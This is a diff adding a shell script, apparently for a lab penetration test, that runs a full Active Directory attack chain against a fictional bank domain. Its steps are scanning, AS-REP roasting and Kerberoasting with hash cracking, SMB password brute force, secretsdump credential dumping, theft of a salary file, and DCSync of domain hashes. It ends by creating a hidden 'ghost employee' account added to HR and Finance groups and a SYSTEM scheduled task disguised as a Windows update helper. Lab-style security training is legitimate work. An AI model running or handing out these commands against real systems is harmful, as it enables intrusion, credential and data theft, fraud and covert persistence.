@@ -1,0 +1,46 @@
+# Prepare folders
+mkdir -p ~/P1-VAPT/{recon,hashes,post-exploit,evidence/attack1,persistence}
+
+# 1. Recon
+nmap -sC -sV -O 192.168.10.10 192.168.10.30 192.168.10.50 -oN ~/P1-VAPT/recon/full-scan.txt
+
+# 2. AS-REP Roasting + crack
+impacket-GetNPUsers NexusBank.internal/ -usersfile /usr/share/wordlists/usernames.txt \
+  -format hashcat -outputfile ~/P1-VAPT/hashes/asrep.txt -dc-ip 192.168.10.10 -no-pass
+hashcat -m 18200 ~/P1-VAPT/hashes/asrep.txt ~/wordlist.txt --force -o ~/P1-VAPT/hashes/asrep-cracked.txt
+
+# 3. Brute force + lateral discovery
+nxc smb 192.168.10.10 -u intern.user1 -p ~/wordlist.txt | tee ~/P1-VAPT/post-exploit/brute-force.txt
+nxc smb 192.168.10.0/24 -u intern.user1 -p 'Intern@NXB2026' | tee ~/P1-VAPT/post-exploit/lateral.txt
+smbclient //192.168.10.30/C$ -U 'NexusBank.internal/intern.user1%Intern@NXB2026' -c 'ls' \
+  | tee ~/P1-VAPT/post-exploit/cl01-c$.txt
+
+# 4. secretsdump CL01 + expected fail on DC01
+impacket-secretsdump intern.user1:'Intern@NXB2026'@192.168.10.30 2>&1 | tee ~/P1-VAPT/post-exploit/secretsdump-cl01.txt
+impacket-secretsdump intern.user1:'Intern@NXB2026'@192.168.10.10 2>&1 | tee ~/P1-VAPT/post-exploit/secretsdump-dc01-denied.txt
+
+# 5. Kerberoasting + crack
+impacket-GetUserSPNs NexusBank.internal/intern.user1:'Intern@NXB2026' \
+  -dc-ip 192.168.10.10 -request -outputfile ~/P1-VAPT/hashes/kerberoast.txt
+hashcat -m 19700 ~/P1-VAPT/hashes/kerberoast.txt ~/wordlist.txt --force -o ~/P1-VAPT/hashes/kerberoast-cracked.txt
+
+# 6. Finance exfil
+impacket-smbclient intern.user1:'Intern@NXB2026'@192.168.10.10 << EOF
+use Finance
+get employee_salaries.csv.txt
+exit
+EOF
+mv employee_salaries.csv.txt ~/P1-VAPT/evidence/attack1/ 2>/dev/null
+
+# 7. DCSync
+impacket-secretsdump arjun.verma:'ITAdmin@NXB2026'@192.168.10.10 -just-dc-ntlm 2>&1 \
+  | tee ~/P1-VAPT/post-exploit/dcsync.txt
+
+# 8. Ghost employee + persistence
+evil-winrm -i 192.168.10.10 -u arjun.verma -p 'ITAdmin@NXB2026' << EOF
+net user ghost.employee "Ghost@Fraud2026!" /add /domain /Y
+net group GRP_HR_Staff ghost.employee /add /domain
+net group GRP_Finance_Staff ghost.employee /add /domain
+schtasks /create /tn "WindowsUpdateHelper" /tr "cmd.exe /c echo persistence" /sc onstart /ru SYSTEM /f
+exit
+EOF
